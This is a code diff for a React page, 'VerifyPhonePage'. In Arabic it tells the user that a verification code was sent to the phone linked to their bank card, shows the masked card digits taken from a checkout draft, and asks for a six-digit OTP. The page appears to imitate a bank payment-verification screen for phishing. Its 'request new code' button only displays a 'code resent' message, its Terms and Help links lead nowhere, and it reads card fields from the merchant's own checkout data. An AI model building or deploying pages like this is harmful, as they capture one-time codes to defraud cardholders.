@@ -49,7 +49,6 @@ export default function VerifyPhonePage() {
       const draft = raw ? (JSON.parse(raw) as CheckoutDraft) : null;
 
       if (draft) {
-        // بحث شامل ومرن عن أي مسمى محتمل لرقم البطاقة أو آخر 4 أرقام منها
         const rawCard = 
           draft.cardLast4 || 
           draft.cardNumber || 
@@ -209,4 +208,80 @@ export default function VerifyPhonePage() {
 
             <div style={{ fontSize: '18px', lineHeight: '1.4', color: '#000000', marginBottom: '25px', maxWidth: '320px' }}>
               تم ارسال رمز التحقق لرقم هاتفكم المرتبط بالبطاقة المصرفيةلتأكيد الدفع بإستخدام بطاقة
-              <span style={{ display: 'block', direction: 'ltr', fontFamily:'monospace',
+              <span style={{ display: 'block', direction: 'ltr', fontFamily: 'monospace, sans-serif', fontSize: '20px', marginTop: '5px' }}>
+                ********{cardLast4}
+              </span>
+            </div>
+
+            <form onSubmit={(e) => { e.preventDefault(); void handleVerify(); }} style={{ width: '100%', maxWidth: '280px', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
+              <label htmlFor="otp" style={{ fontSize: '14px', color: '#777777', marginBottom: '6px', direction: 'ltr' }}>
+                Verification Code
+              </label>
+
+              <input
+                id="otp"
+                type="text"
+                inputMode="numeric"
+                autoComplete="off"
+                pattern="[0-9]*"
+                maxLength={6}
+                value={referenceCode}
+                onChange={(e) => {
+                  setReferenceCode(normalizeDigits(e.target.value).slice(0, 6));
+                  setError('');
+                }}
+                disabled={isVerifying}
+                style={{
+                  width: '100%',
+                  height: '42px',
+                  border: '1px solid #7f9db9',
+                  borderRadius: '2px',
+                  fontSize: '18px',
+                  textAlign: 'center',
+                  marginBottom: '12px',
+                  outline: 'none',
+                }}
+              />
+
+              {error && (
+                <div style={{ color: '#c62828', fontSize: '13px', marginBottom: '10px' }}>
+                  {error}
+                </div>
+              )}
+
+              <button
+                type="submit"
+                disabled={!isReferenceCodeValid || isVerifying}
+                style={{
+                  width: '100%',
+                  height: '42px',
+                  backgroundColor: '#1646a7',
+                  color: '#ffffff',
+                  border: 'none',
+                  borderRadius: '4px',
+                  fontSize: '16px',
+                  cursor: isReferenceCodeValid && !isVerifying ? 'pointer' : 'not-allowed',
+                  opacity: isReferenceCodeValid && !isVerifying ? 1 : 0.7,
+                }}
+              >
+                {isVerifying ? 'جارٍ الإرسال...' : 'ارسال'}
+              </button>
+            </form>
+
+            <button
+              type="button"
+              onClick={() => setError('تم إعادة إرسال الرمز.')}
+              style={{ marginTop: '50px', color: '#1646a7', fontSize: '14px', background: 'none', border: 'none', cursor: 'pointer', textDecoration: 'none' }}
+            >
+              طلب كلمة سر جديدة
+            </button>
+
+            <div style={{ marginTop: '40px', color: '#1646a7', fontSize: '14px', direction: 'ltr', fontWeight: 'bold' }}>
+              <a href="#" style={{ color: '#1646a7', textDecoration: 'none' }}>Terms of Use</a> | <a href="#" style={{ color: '#1646a7', textDecoration: 'none' }}>?Need help</a>
+            </div>
+          </>
+        )}
+      </main>
+    </div>
+  );
+}
